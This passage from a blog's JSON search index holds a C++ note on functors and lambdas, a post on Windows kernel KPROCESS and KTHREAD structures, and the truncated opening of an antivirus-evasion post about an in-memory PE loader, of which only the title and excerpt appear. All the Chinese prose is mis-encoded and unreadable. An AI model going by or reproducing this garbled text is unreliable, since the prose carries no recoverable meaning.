æŠ“å‡½æ•°ä¸­ç”Ÿæˆä¸€ä¸ªå¯¹è±¡ï¼ˆè¯¥æ ‡å‡†ä»…åœ¨c++11åŠä»¥ä¸Šæ”¯æŒï¼‰ï¼Œä½†æ˜¯è¿™æ ·å‡½æ•°æŒ‡é’ˆå°±æ²¡æ³•ç”¨äº† 1Greater&lt;int&gt; greater20&#123;20&#125;; å¯ä»¥å­¦ä¹ æ ‡å‡†åº“ä¸­çš„æ“ä½œå°†æ¨¡æ¿æŒç»­ä¸‹å» 12345678910template &lt;typename T, typename fCompare&gt;int CountMatch(T* start, T* end, fCompare ConditionFunc)&#123; int sum = 0; for (; start &lt; end ; start++) &#123; if (ConditionFunc(*start)) sum++; &#125; return sum;&#125; æœ€åç¨‹åº 1234567891011121314151617181920212223242526272829303132#include &lt;iostream&gt;template &lt;typename T, typename fCompare&gt;int CountMatch(T* start, T* end, fCompare ConditionFunc)&#123; int sum = 0; for (; start &lt; end ; start++) &#123; if (ConditionFunc(*start)) sum++; &#125; return sum;&#125;template &lt;typename T&gt;struct Greater&#123; T mVal; //æŒæœ‰çš„çŠ¶æ€ explicit Greater(T value): mVal(value)&#123;&#125; bool operator()(const T &amp;val) const &#123; return val&gt;mVal; &#125;&#125;;int main()&#123; int IntArray[] = &#123; 12, 13, 35, 16, 6, 5, 5, 12, 4, 13, 38, 35, 37, 33, 35, 15, 36, 14, 13, 12 &#125;; std::string StrArray[] = &#123;&quot;Hello&quot;,&quot;world&quot;,&quot;This&quot;,&quot;is&quot;,&quot;a&quot;,&quot;test&quot;&#125;; Greater&lt;int&gt; greater20&#123;20&#125;; //ç»Ÿè®¡å¤§äº20çš„æ•°å­— std::cout&lt;&lt;&quot;Greater than 20 Matches: &quot;&lt;&lt;CountMatch( IntArray, IntArray+20, greater20 )&lt;&lt;std::endl; return 0;&#125; lambdaè¡¨è¾¾å¼ è¿™ä¸ªæˆ‘å†Qtä¸Šç”¨çš„æŒºå¤šçš„ï¼Œä»–æ˜¯åŒ¿åå‡½æ•°çš„å®ç° 1234567int main()&#123; int IntArray[] = &#123; 12, 13, 35, 16, 6, 5, 5, 12, 4, 13, 38, 35, 37, 33, 35, 15, 36, 14, 13, 12 &#125;; auto greater20 = [](auto &amp;val) -&gt; bool &#123; return val &gt; 20; &#125;; //ç»Ÿè®¡å¤§äº20çš„æ•°å­— std::cout&lt;&lt;&quot;Greater than 20 Matches: &quot;&lt;&lt;CountMatch( IntArray, IntArray+20, greater20 )&lt;&lt;std::endl; return 0;&#125;","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"https://joe1sn.eu.org/tags/cpp/"}]},{"title":"ã€winå†…æ ¸åŸç†ä¸å®ç°ã€‘II. è¿›ç¨‹ä¸çº¿ç¨‹","slug":"windows-kernel-2-process&thread","date":"2023-06-14T01:41:52.000Z","updated":"2023-06-14T03:10:04.422Z","comments":true,"path":"2023/06/14/windows-kernel-2-process&thread/","link":"","permalink":"https://joe1sn.eu.org/2023/06/14/windows-kernel-2-process&thread/","excerpt":"Windowsä¸­è¿›ç¨‹ä¸çº¿ç¨‹çš„è®¾ç½®","text":"Windowsä¸­è¿›ç¨‹ä¸çº¿ç¨‹çš„è®¾ç½® å…³äºè¿›ç¨‹ä¸çº¿ç¨‹ æ“ä½œç³»ç»Ÿâ€œå¤ä¹ â€ â€‹ åœ¨å­¦ä¹ æ“ä½œç³»ç»Ÿçš„æ—¶å€™ï¼Œæœ‰ä¸ªé‡ç‚¹å°±æ˜¯è¿›ç¨‹ä¸çº¿ç¨‹çš„åŒºåˆ«ã€‚æœ€å¼€å§‹è¿›ç¨‹å’Œçº¿ç¨‹æ˜¯æ²¡æœ‰åˆ†å¼€çš„ï¼Œç”±äºå¤šæ•°æ“ä½œç³»ç»Ÿåˆ†å¼€äº†ç”¨æˆ·æ€å’Œå†…æ ¸æ€ï¼Œé‚£ä¹ˆç”¨æˆ·æ€å°±å¿…é¡»å’Œå†…æ ¸æ€è¿›è¡Œäº¤äº’æ‰èƒ½è°ƒç”¨ç³»ç»Ÿèµ„æºï¼ˆé€šè¿‡IOCTLäº¤äº’ï¼‰ã€‚è¿™æ ·æ¯ä¸€ä¸ªè¿›ç¨‹åœ¨å†…æ ¸å½“ä¸­éƒ½æœ‰ä¸€ä¸ªâ€œè¿›ç¨‹æè¿°ç¬¦â€çš„ä¸œè¥¿æ¥æè¿°è¿™ä¸ªè¿›ç¨‹ï¼Œå¹¶æ ¹æ®è°ƒåº¦ç®—æ³•å®Œæˆè¿›ç¨‹çš„è¿è¡Œã€‚è¿™é‡Œå°±å‡è®¾ä¸€ä¸ªè¿›ç¨‹test.exeè°ƒç”¨äº†0x40å¤§å°çš„å†…å­˜ç©ºé—´ï¼Œåœ¨åªæœ‰è¿›ç¨‹çš„æ—¶å€™ï¼Œè¿›ç¨‹æè¿°ç¬¦ä¸­å°±ä¼šæ ‡è®°è¿™ä¸ªå†…å­˜è¢«è¿™ä¸ªè¿›ç¨‹ä½¿ç”¨ï¼ŒåŒæ—¶æŒ‡ä»¤å’Œè¿è¡Œéƒ½åœ¨å…¶ä¸­ã€‚ â€‹ è¿™æ ·æœ‰ä¸ªé—®é¢˜å°±æ˜¯ï¼Œæˆ‘éœ€è¦ä¸¤ä¸ªè¿™ç§â€œè¿›ç¨‹â€æ¥è¿è¡Œï¼Œä¸”ä»–ä»¬éœ€è¦çš„æ°å¥½æ˜¯åŒä¸€å—å†…å­˜çš„ç›¸åŒæ•°æ®ï¼Œå¦‚æœåªæœ‰è¿›ç¨‹çš„è¯ï¼Œå°±ä¼šå­˜åœ¨ä¸¤ä¸ª0x40çš„å†…å­˜ï¼ŒåŒæ—¶é€ æˆä¸å¿…è¦çš„å¤åˆ¶ç²˜è´´ã€‚éšåå°±æœ‰äº†çº¿ç¨‹è¿™ä¸ªæ¦‚å¿µï¼Œæ¯”å¦‚é¢å¯¹ä¸Šè¿°æƒ…å†µï¼Œè¿›ç¨‹å°±åªå«æœ‰ä¸€ä¸ª0x40å¤§å°çš„å†…å­˜ï¼Œå¯¹å†…å­˜çš„è®¿é—®å°±äº¤ç»™è¿™ä¸ªçº¿ç¨‹å¯¹åº”çš„è¿›ç¨‹ã€‚ è¿›ç¨‹å’Œç¨‹åº â€‹ Windowsçš„ä»»åŠ¡è°ƒåº¦ç®—æ³•å¯ä»¥å¾ˆå¥½åœ°é€‚åº”å¤šå¤„ç†å™¨å’Œå¤šä»»åŠ¡çš„æƒ…å½¢ï¼Œåœ¨windowsä¸­çš„è¿›ç¨‹ä¹Ÿéµå®ˆä¸Šè¿°çš„å‡†åˆ™ã€‚å¯¹äºWindowså†…æ ¸éœ€è¦åšçš„äº‹æƒ…æ˜¯ï¼šç»´æŠ¤ä¸€ä¸ªå…¨å±€çš„è¿›ç¨‹è¡¨ï¼Œè®°å½•ä¸‹å½“å‰æœ‰å“ªäº›è¿›ç¨‹æ­£ åœ¨è¢«æ‰§è¡Œï¼›æŠŠæ—¶é—´åˆ†æˆé€‚å½“çš„ç‰‡æ®µï¼Œåœ¨ç°ä»£å¤„ç†å™¨ç»“æ„ä¸­ï¼Œè¿™å¯ä»¥é€šè¿‡è®¾ç½®æ—¶é’Ÿä¸­æ–­æ¥å®Œæˆï¼Œå› è€Œæ¯æ¬¡æ—¶é’Ÿä¸­æ–­åˆ°æ¥æ—¶ç³»ç»Ÿå°±ä¼šè·å¾—æ§åˆ¶æƒï¼›åœ¨è¿›ç¨‹é—´å®æ–½åˆ‡æ¢ï¼Œå³ä¿ç•™ä¸Šä¸€ä¸ªè¿› ç¨‹çš„ç¯å¢ƒä¿¡æ¯ï¼Œæ¢å¤ä¸‹ä¸€ä¸ªè¿›ç¨‹çš„æ‰§è¡Œç¯å¢ƒã€‚å…³äºWindowsçš„è°ƒåº¦ç®—æ³•å¯ä»¥ç®€å•ç†è§£ä¸ºæ—¶é—´è½®ã€‚ â€‹ å¦‚æœç¨‹åºæ˜¯ä¸€ä¸ªå®Œå…¨çš„æ¨¡å—ï¼Œé‚£ä¹ˆä»–çš„å†…å­˜å°±æ˜¯æˆ‘ä»¬ç†Ÿæ‚‰çš„ç»å…¸å†…å­˜ç»“æ„ã€‚ â€‹ ä½†æ˜¯å¾€å¾€ä¸€ä¸ªæœ€ç®€å•çš„helloworldä¹Ÿä¼šè°ƒç”¨CRunTimeçš„ä»£ç ï¼Œæ‰€ä»¥æœ‰è¿›ç¨‹å°±èƒ½ä½¿ç”¨ å…±äº«å†…å­˜ ï¼Œæ¯”å¦‚åœ¨é™æ€æ•°æ®åŒºæœ‰ç€ä¸€ä»½å¤åˆ¶ã€‚ çº¿ç¨‹ â€‹ çº¿ç¨‹ä¸ä»…ä»…æ˜¯ä¸€ä¸ªæ§åˆ¶æµï¼Œå®ƒè¿˜æœ‰æ›´å¤šçš„å†…å®¹ã€‚çº¿ç¨‹çš„è°ƒç”¨æ ˆï¼ˆcall stackï¼‰è®°å½•äº†å®ƒ ä½œä¸ºæ§åˆ¶æµçš„çŠ¶æ€ä¿¡æ¯ï¼ŒåŒ…æ‹¬æ¯ä¸€å±‚å‡½æ•°è°ƒç”¨å’Œè¿”å›çš„æŒ‡ä»¤åœ°å€ã€‚çº¿ç¨‹ä¸€å®šéš¶å±äºæŸä¸ªè¿› ç¨‹ï¼Œå…¶æ§åˆ¶æµå¯ä»¥è®¿é—®è¿™ä¸ªè¿›ç¨‹ä¸­çš„èµ„æºï¼ŒåŒ…æ‹¬æ‰€æœ‰çš„å†…å­˜æ•°æ®ä»¥åŠç³»ç»Ÿåˆ†é…ç»™æ­¤è¿›ç¨‹çš„ å…¶ä»–èµ„æºã€‚ä¸€ä¸ªè¿›ç¨‹å¯ä»¥æœ‰å¤šä¸ªçº¿ç¨‹ï¼Œç”±äºè¿™äº›çº¿ç¨‹éš¶å±äºåŒä¸€ä¸ªè¿›ç¨‹ï¼Œæ‰€ä»¥å®ƒä»¬ä¹‹é—´ç›¸ äº’é€šä¿¡è¦æ–¹ä¾¿å¾—å¤šï¼Œæ¯•ç«Ÿå‡ ä¹æ‰€æœ‰çš„èµ„æºï¼ˆå¹¶éå…¨éƒ¨ï¼‰å¯¹äºå®ƒä»¬æ¥è¯´éƒ½æ˜¯å…±äº«çš„ã€‚ Windows ä¸­è¿›ç¨‹å’Œçº¿ç¨‹çš„æ•°æ®ç»“æ„ å†…æ ¸å±‚çš„è¿›ç¨‹å’Œçº¿ç¨‹å¯¹è±¡ åœ¨å†…æ ¸å½“ä¸­çš„æè¿°ä¸ºKPROCESSå’ŒKTHREADã€‚ åœ¨WRKä¸­çš„å®šä¹‰ä¸º 123456789101112131415161718192021222324252627282930313233343536373839404142434445typedef struct _KPROCESS&#123; DISPATCHER_HEADER Header; //è¡¨æ˜æ˜¯åˆ†å‘å™¨å¯¹è±¡ï¼Œå¯ç”¨äºç­‰å¾…ã€‚è¿›ç¨‹é€€å‡ºæ—¶ï¼Œæ­¤å¯¹è±¡ä¸ºæœ‰ä¿¡å·çŠ¶æ€ LIST_ENTRY ProfileListHead; //è¿›ç¨‹å‚ä¸æ€§èƒ½åˆ†ææ—¶ï¼Œä½œä¸ºèŠ‚ç‚¹åŠ å…¥å…¨å±€æ€§èƒ½åˆ†æè¿›ç¨‹é“¾è¡¨ã€‚ ULONG DirectoryTableBase; // ä¸¤ä¸ªæˆå‘˜çš„æ•°ç»„ï¼Œç¬¬ä¸€ä¸ªæŒ‡å‘é¡µç›®å½•è¡¨åœ°å€ï¼Œç¬¬äºŒä¸ªæŒ‡å‘è¶…ç©ºé—´çš„é¡µç›®å½•è¡¨åœ°å€ ULONG Unused0; KGDTENTRY LdtDescriptor; //LDTçš„æè¿°ç¬¦ KIDTENTRY Int21Descriptor; //ä¸ºäº†å…¼å®¹DOSï¼Œé€šè¿‡int 21hè°ƒç”¨ç³»ç»ŸåŠŸèƒ½ WORD IopmOffset; //æŒ‡å®šIOPMï¼ˆIOæƒé™è¡¨ï¼ŒIO Privilege Mapï¼‰ä½ç½®ã€‚æ§åˆ¶è¿›ç¨‹çš„ç”¨æˆ·æ¨¡å¼IOè®¿é—®æƒé™ UCHAR Iopl; //IOä¼˜å…ˆçº§ï¼ˆIO Privilege Levelï¼‰ UCHAR Unused; ULONG ActiveProcessors; //è®°å½•è¿›ç¨‹æ­£åœ¨å“ªäº›å¤„ç†å™¨ä¸Šè¿è¡Œ ULONG KernelTime; //åœ¨å†…æ ¸æ¨¡å¼è¿è¡Œæ‰€èŠ±æ—¶é—´ ULONG UserTime; //åœ¨ç”¨æˆ·æ¨¡å¼è¿è¡Œæ‰€èŠ±æ—¶é—´ LIST_ENTRY ReadyListHead; //ä¿å­˜è¿›ç¨‹ä¸­å¤„äºå°±ç»ªçŠ¶æ€ä½†æœªè¢«åŠ å…¥å…¨å±€å°±ç»ªé“¾è¡¨çš„çº¿ç¨‹ SINGLE_LIST_ENTRY SwapListEntry; //è¿›ç¨‹è¦è¢«æ¢å‡ºæ—¶ï¼Œé€šè¿‡æ­¤åŸŸåŠ å…¥åˆ°KiProcessOutSwapListHeadä¸ºå¤´çš„å•é“¾è¡¨ PVOID VdmTrapcHandler; //VDMç¯å¢ƒä¸‹è¿è¡Œ16ä½ç¨‹åºæ—¶ï¼Œå¤„ç†Ctrl+Cä¸­æ–­çš„å‡½æ•° LIST_ENTRY ThreadListHead; //æŒ‡å‘ä¸€ä¸ªé“¾è¡¨å¤´ï¼Œé“¾è¡¨ä¸­åŒ…å«è¯¥è¿›ç¨‹çš„æ‰€æœ‰çº¿ç¨‹ ULONG ProcessLock; //ä¸€ä¸ªè‡ªæ—‹é”å¯¹è±¡ã€‚ä¿è¯å¯¹è¿›ç¨‹æ•°æ®ç»“æ„ä¸­æˆå‘˜çš„äº’æ–¥è®¿é—® ULONG Affinity; //æŒ‡å®šè¯¥è¿›ç¨‹çš„çº¿ç¨‹å¯ä»¥åœ¨å“ªäº›å¤„ç†å™¨ä¸Šè¿è¡Œ union &#123; ULONG AutoAlignment: 1; ULONG DisableBoost: 1; // ULONG DisableQuantum: 1; ULONG ReservedFlags: 29; LONG ProcessFlags; &#125;; CHAR BasePriority; //è¯¥è¿›ç¨‹çš„çº¿ç¨‹çš„åŸºæœ¬ä¼˜å…ˆçº§ CHAR QuantumReset; //è¿›ç¨‹ä¸­çº¿ç¨‹çš„åŸºæœ¬æ—¶é™é‡ç½®å€¼ UCHAR State; //è¯´æ˜è¿›ç¨‹æ˜¯å¦åœ¨å†…å­˜ä¸­ UCHAR ThreadSeed; //è¯¥è¿›ç¨‹çš„ä¸‹ä¸€ä¸ªåˆ›å»ºçº¿ç¨‹çš„ç†æƒ³å¤„ç†å™¨ UCHAR PowerState; //ç”µæºçŠ¶æ€ UCHAR IdealNode; //è¿›ç¨‹ä¼˜å…ˆé€‰æ‹©çš„å¤„ç†å™¨èŠ‚ç‚¹ UCHAR Visited; union &#123; KEXECUTE_OPTIONS Flags; UCHAR ExecuteOptions; //NXæ‰§è¡Œé€‰é¡¹ &#125;; ULONG StackCount; //å½“å‰è¿›ç¨‹ä¸­æœ‰å¤šå°‘ä¸ªçº¿ç¨‹çš„æ ˆä½äºå†…å­˜ä¸­ LIST_ENTRY ProcessListEntry; //å½“å‰ç³»ç»Ÿä¸­æ‰€æœ‰å…·æœ‰æ´»åŠ¨çº¿ç¨‹çš„è¿›ç¨‹é€šè¿‡è¿™ä¸ªåŸŸä¸²æˆä¸€ä¸ªé“¾è¡¨ UINT64 CycleTime;&#125; KPROCESS, *PKPROCESS; é‚£ä¹ˆåœ¨çº¿ç¨‹å½“ä¸­ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181typedef struct _KTHREAD&#123; DISPATCHER_HEADER Header; UINT64 CycleTime; ULONG HighCycleTime; UINT64 QuantumTarget; PVOID InitialStack; PVOID StackLimit; PVOID KernelStack; ULONG ThreadLock; union &#123; KAPC_STATE ApcState; UCHAR ApcStateFill[23]; &#125;; CHAR Priority; WORD NextProcessor; WORD DeferredProcessor; ULONG ApcQueueLock; ULONG ContextSwitches; UCHAR State; UCHAR NpxState; UCHAR WaitIrql; CHAR WaitMode; LONG WaitStatus; union &#123; PKWAIT_BLOCK WaitBlockList; PKGATE GateObject; &#125;; union &#123; ULONG KernelStackResident: 1; ULONG ReadyTransition: 1; ULONG ProcessReadyQueue: 1; ULONG WaitNext: 1; ULONG SystemAffinityActive: 1; ULONG Alertable: 1; ULONG GdiFlushActive: 1; ULONG Reserved: 25; LONG MiscFlags; &#125;; UCHAR WaitReason; UCHAR SwapBusy; UCHAR Alerted[2]; union &#123; LIST_ENTRY WaitListEntry; SINGLE_LIST_ENTRY SwapListEntry; &#125;; PKQUEUE Queue; ULONG WaitTime; union &#123; struct &#123; SHORT KernelApcDisable; SHORT SpecialApcDisable; &#125;; ULONG CombinedApcDisable; &#125;; PVOID Teb; union &#123; KTIMER Timer; UCHAR TimerFill[40]; &#125;; union &#123; ULONG AutoAlignment: 1; ULONG DisableBoost: 1; ULONG EtwStackTraceApc1Inserted: 1; ULONG EtwStackTraceApc2Inserted: 1; ULONG CycleChargePending: 1; ULONG CalloutActive: 1; ULONG ApcQueueable: 1; ULONG EnableStackSwap: 1; ULONG GuiThread: 1; ULONG ReservedFlags: 23; LONG ThreadFlags; &#125;; union &#123; KWAIT_BLOCK WaitBlock[4]; struct &#123; UCHAR WaitBlockFill0[23]; UCHAR IdealProcessor; &#125;; struct &#123; UCHAR WaitBlockFill1[47]; CHAR PreviousMode; &#125;; struct &#123; UCHAR WaitBlockFill2[71]; UCHAR ResourceIndex; &#125;; UCHAR WaitBlockFill3[95]; &#125;; UCHAR LargeStack; LIST_ENTRY QueueListEntry; PKTRAP_FRAME TrapFrame; PVOID FirstArgument; union &#123; PVOID CallbackStack; ULONG CallbackDepth; &#125;; PVOID ServiceTable; UCHAR ApcStateIndex; CHAR BasePriority; CHAR PriorityDecrement; UCHAR Preempted; UCHAR AdjustReason; CHAR AdjustIncrement; UCHAR Spare01; CHAR Saturation; ULONG SystemCallNumber; ULONG Spare02; ULONG UserAffinity; PKPROCESS Process; ULONG Affinity; PKAPC_STATE ApcStatePointer[2]; union &#123; KAPC_STATE SavedApcState; UCHAR SavedApcStateFill[23]; &#125;; CHAR FreezeCount; CHAR SuspendCount; UCHAR UserIdealProcessor; UCHAR Spare03; UCHAR Iopl; PVOID Win32Thread; PVOID StackBase; union &#123; KAPC SuspendApc; struct &#123; UCHAR SuspendApcFill0[1]; CHAR Spare04; &#125;; struct &#123; UCHAR SuspendApcFill1[3]; UCHAR QuantumReset; &#125;; struct &#123; UCHAR SuspendApcFill2[4]; ULONG KernelTime; &#125;; struct &#123; UCHAR SuspendApcFill3[36]; PKPRCB WaitPrcb; &#125;; struct &#123; UCHAR SuspendApcFill4[40]; PVOID LegoData; &#125;; UCHAR SuspendApcFill5[47]; &#125;; UCHAR PowerState; ULONG UserTime; union &#123; KSEMAPHORE SuspendSemaphore; UCHAR SuspendSemaphorefill[20]; &#125;; ULONG SListFaultCount; LIST_ENTRY ThreadListEntry; LIST_ENTRY MutantListHead; PVOID SListFaultAddress; PVOID MdlForLockedTeb;&#125; KTHREAD, *PKTHREAD; Headerï¼šè¯´æ˜è¯¥å¯¹è±¡æ˜¯ä¸€ä¸ªåˆ†å‘å™¨å¯¹è±¡ï¼Œå¯ä»¥è¢«ç­‰å¾…ã€‚çº¿ç¨‹ç»“æŸæ—¶ï¼Œç­‰å¾…è¢«æ»¡è¶³ã€‚ MutantListHeadï¼šæŒ‡å‘ä¸€ä¸ªé“¾è¡¨å¤´ã€‚é“¾è¡¨ä¸­åŒ…å«æ‰€æœ‰å±äºè¯¥çº¿ç¨‹çš„çªå˜ä½“å¯¹è±¡ï¼ˆmutantï¼Œå¯¹åº”äº’æ–¥ä½“å¯¹è±¡ï¼‰ã€‚ InitialStackï¼šåŸå§‹æ ˆä½ç½®ï¼ˆé«˜åœ°å€ï¼‰ StackLimitï¼šæ ˆä½åœ°å€ KernelStackï¼šå†…æ ¸è°ƒç”¨æ ˆå¼€å§‹ä½ç½® StackBaseï¼šå½“å‰æ ˆçš„åŸºåœ°å€ã€‚ ThreadLockï¼šè‡ªæ—‹é”ï¼Œç”¨äºä¿æŠ¤çº¿ç¨‹æ•°æ®æˆå‘˜ã€‚ ApcStateï¼šKAPC_STATEç»“æ„ï¼ŒæŒ‡å®šçº¿ç¨‹çš„APCä¿¡æ¯ï¼ŒåŒ…æ‹¬APCé“¾è¡¨ï¼Œæ˜¯å¦æœ‰APCæ­£åœ¨ç­‰å¾…ï¼Œæ˜¯å¦æ­£åœ¨å¤„ç†APCã€‚ ApcQueueableï¼šæ˜¯å¦å¯æ’å…¥APC NextProcessorï¼šå…³äºå¤„ç†å™¨è°ƒåº¦çš„é€‰æ‹©ã€‚ DeferredProcessorï¼šå…³äºå¤„ç†å™¨è°ƒåº¦çš„é€‰æ‹©ã€‚ AdjustReasonï¼šä¼˜å…ˆçº§è°ƒæ•´åŸå›  AdjustIncrementï¼šä¼˜å…ˆçº§è°ƒæ•´è°ƒæ•´é‡ ApcQueueLockï¼šä¿æŠ¤APCé˜Ÿåˆ—çš„è‡ªæ—‹é”ã€‚ ContextSwitchesï¼šè®°å½•çº¿ç¨‹è¿›è¡Œäº†å¤šå°‘æ¬¡åˆ‡æ¢ã€‚ Stateï¼šçº¿ç¨‹å½“å‰çŠ¶æ€ã€‚ NpxStateï¼šæµ®ç‚¹å¤„ç†å™¨çŠ¶æ€ã€‚ Alertableï¼šçº¿ç¨‹æ˜¯å¦å¯ä»¥è¢«å”¤é†’ã€‚ WaitNextï¼š WaitIrqlï¼šåŸå…ˆçš„IRQLã€‚ WaitReasonï¼šç­‰å¾…åŸå›  WaitModeï¼šçº¿ç¨‹ç­‰å¾…æ—¶çš„å¤„ç†å™¨æ¨¡å¼ï¼Œå†…æ ¸orç”¨æˆ· WaitStatusï¼šç­‰å¾…çš„ç»“æœçŠ¶æ€ã€‚ WaitBlockListï¼šKWAIT_BLOCKä¸ºå…ƒç´ çš„é“¾è¡¨ï¼Œè®°å½•çº¿ç¨‹æ‰€æœ‰ç­‰å¾…çš„åˆ†å‘å™¨å¯¹è±¡ã€‚æ¯ä¸ªåˆ†å‘å™¨å¯¹è±¡ä¹Ÿæœ‰ä¸€ä¸ªKWAIT_BLOCKç»„æˆçš„é“¾è¡¨ï¼Œè®°å½•æ‰€æœ‰ç­‰å¾…åœ¨è¯¥å¯¹è±¡çš„çº¿ç¨‹ã€‚ GateObjectï¼šç­‰å¾…çš„é—¨å¯¹è±¡ï¼Œç­‰å¾…é—¨å¯¹è±¡å’Œç­‰å¾…åˆ†å‘å™¨å¯¹è±¡ä¸ä¼šåŒæ—¶å‘ç”Ÿã€‚ Priorityï¼šåŠ¨æ€ä¼˜å…ˆçº§ã€‚ BasePriorityï¼šåŸºæœ¬ä¼˜å…ˆçº§ã€‚ PriorityDecrementï¼šä¼˜å…ˆçº§åŠ¨æ€è°ƒæ•´è¿‡ç¨‹ä¸­çš„é€’å‡å€¼ã€‚ Saturationï¼šçº¿ç¨‹åŸºæœ¬ä¼˜å…ˆçº§è°ƒæ•´ç›¸å¯¹äºè¿›ç¨‹åŸºæœ¬ä¼˜å…ˆçº§æ˜¯å¦è¶…è¿‡äº†åŒºé—´çš„ä¸€åŠã€‚ EnableStackSwapï¼šå†…æ ¸æ ˆæ˜¯å¦å‡†è®¸è¢«æ¢å‡ºã€‚ SwapBusyï¼šå½“å‰æ˜¯å¦æ­£åœ¨è¿›ç¨‹ä¸Šä¸‹æ–‡åˆ‡æ¢ã€‚ Alertedï¼šçº¿ç¨‹åœ¨è­¦å‘Šæ¨¡å¼ä¸‹æ˜¯å¦å¯ä»¥è¢«å”¤é†’ã€‚ WaitListEntryï¼šåŒå‘é“¾è¡¨èŠ‚ç‚¹ï¼Œç­‰å¾…è¢«æ‰§è¡Œæ—¶ï¼Œä½œä¸ºèŠ‚ç‚¹åŠ å…¥æŸé“¾è¡¨ SwapListEntryï¼šå•é“¾è¡¨èŠ‚ç‚¹ï¼Œå†…æ ¸æ ˆéœ€è¦è¢«æ¢å‡ºæ—¶ï¼ŒåŠ å…¥KiStackInSwapListHeadä¸ºå¤´çš„é“¾è¡¨ã€‚å¦å¤–ï¼Œçº¿ç¨‹å¤„äºDeferredReadyçŠ¶æ€æ—¶åŠ å…¥DeferredReadyListHeadä¸ºå¤´çš„é“¾è¡¨ã€‚ Queueï¼šé˜Ÿåˆ—åˆ†å‘å™¨å¯¹è±¡ï¼Œçº¿ç¨‹æ­£åœ¨å¤„ç†æ­¤é˜Ÿåˆ—ä¸­çš„é¡¹ã€‚ WaitTimeï¼šçº¿ç¨‹è¿›å…¥ç­‰å¾…æ—¶åˆ»çš„æ—¶é—´ç‚¹ã€‚ KernelApcDisable/SpecialApcDisableï¼šå†…æ ¸APCå’Œç‰¹æ®Šå†…æ ¸APCæ˜¯å¦è¢«ç¦æ­¢ã€‚ TEBï¼šè¿›ç¨‹åœ°å€ç©ºé—´çš„ä¸€ä¸ªTEBåŸŸ Timerï¼šå®šæ—¶å™¨ã€‚ AutoAlignmentï¼šä¸KPROCESSç›¸åŒ DisableBoostï¼šä¸KPROCESSç›¸åŒ WaitBlockï¼š4ä¸ªKWAIT_BLOCKæˆå‘˜çš„æ•°ç»„ï¼Œçº¿ç¨‹ç­‰å¾…çš„åˆ†å‘å™¨å°‘äº4ä¸ªæ—¶ï¼Œä½¿ç”¨è¿™é‡Œçš„ç©ºé—´ï¼Œä¸åˆ†é…æ–°ç©ºé—´ã€‚ QueueListEntryï¼šçº¿ç¨‹å¤„ç†ä¸€ä¸ªé˜Ÿåˆ—é¡¹æ—¶ï¼ŒåŠ å…¥åˆ°é˜Ÿåˆ—å¯¹è±¡çš„çº¿ç¨‹é“¾è¡¨ä¸­çš„åœ°å€ã€‚ TrapFrameï¼šæŒ‡å‘KTRAP_FRAMEç±»å‹çš„æŒ‡é’ˆã€‚ç”¨æˆ·ä¿å­˜æ‰§è¡Œç°åœºã€‚ CallbackStackï¼šçº¿ç¨‹çš„å›è°ƒæ ˆåœ°å€ï¼Œåœ¨ä»å†…æ ¸æ¨¡å¼è¿”å›ç”¨æˆ·æ¨¡å¼æ—¶ç”¨ã€‚ ServiceTableï¼š æŒ‡å‘ç³»ç»Ÿä½¿ç”¨çš„ç³»ç»ŸæœåŠ¡è¡¨ï¼ŒéGUIçº¿ç¨‹ä¸ºKeServiceDescriptorTableï¼ŒGUIçº¿ç¨‹ä¸ºKeServiceDescriptorTableShadowã€‚ IdealProcessï¼šç†æƒ³å¤„ç†å™¨ Preemptedï¼šæ˜¯å¦è¢«é«˜ä¼˜å…ˆçº§çº¿ç¨‹æŠ¢å äº†ã€‚ ProcessReadyQueueï¼šæ˜¯å¦åœ¨è¿›ç¨‹å¯¹è±¡çš„ReadyListHeadåˆ—è¡¨ä¸­ã€‚ KernelStackResidentï¼šçº¿ç¨‹çš„å†…æ ¸æ ˆæ˜¯å¦é©»ç•™åœ¨çº¿ç¨‹ä¸­ã€‚ Affinityï¼šå¤„ç†å™¨äº²å’Œæ€§ï¼Œä¸ºçº¿ç¨‹æŒ‡å®šçš„å¤„ç†å™¨é›†åˆå¿…é¡»æ˜¯è¯¥é›†åˆçš„å­é›†ã€‚ UserAffinityï¼šçº¿ç¨‹çš„ç”¨æˆ·äº²å’Œæ€§ã€‚ Processï¼šæ‰§è¡Œçº¿ç¨‹çš„è¿›ç¨‹å¯¹è±¡ã€‚ ApcStateIndexï¼šæŒ‡æ˜å½“å‰APCçŠ¶æ€åœ¨ApcStatePointeråŸŸä¸­çš„ç´¢å¼•ã€‚ Win32Threadï¼šæŒ‡å‘Windowså­ç³»ç»Ÿç®¡ç†çš„åŒºåŸŸçš„æŒ‡é’ˆã€‚ SuspendApc/SuspendSemaphoreï¼šç”¨äºæ”¯æŒçº¿ç¨‹æŒ‚èµ·çš„åŸŸã€‚ ThreadListEntryï¼šåŒé“¾è¡¨çš„èŠ‚ç‚¹ï¼Œçº¿ç¨‹è¢«åˆ›å»ºæ—¶ï¼ŒåŠ å…¥åˆ°è¿›ç¨‹çš„ThreadListHeadé“¾è¡¨ä¸­ã€‚ SListFaultAddressï¼šä¸Šä¸€æ¬¡ç”¨æˆ·æ¨¡å¼äº’é”å•é“¾è¡¨POPæ“ä½œå‘ç”Ÿé¡µé¢é”™è¯¯çš„åœ°å€ã€‚ SuspendSemaphoreï¼šä¸ä¸Šé¢æœ‰å…³ã€‚","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"},{"name":"kernel","slug":"notes/kernel","permalink":"https://joe1sn.eu.org/categories/notes/kernel/"}],"tags":[{"name":"kernel","slug":"kernel","permalink":"https://joe1sn.eu.org/tags/kernel/"},{"name":"windows","slug":"windows","permalink":"https://joe1sn.eu.org/tags/windows/"}]},{"title":"ã€å…æ€ã€‘å†…å­˜åŠ è½½PEæ–‡ä»¶","slug":"pe-loader","date":"2023-06-13T00:46:20.000Z","updated":"2023-06-13T05:14:54.198Z","comments":true,"path":"2023/06/13/pe-loader/","link":"","permalink":"https://joe1sn.eu.org/2023/06/13/pe-loader/","excerpt":"ä½¿ç”¨windows APIç¼–å†™PEæ–‡ä»¶åŠ è½½å™¨ï¼ˆLoaderï¼‰ ç›®å‰æ”¯æ”¯æŒ32ä½","text":"ä½¿ç”¨windows 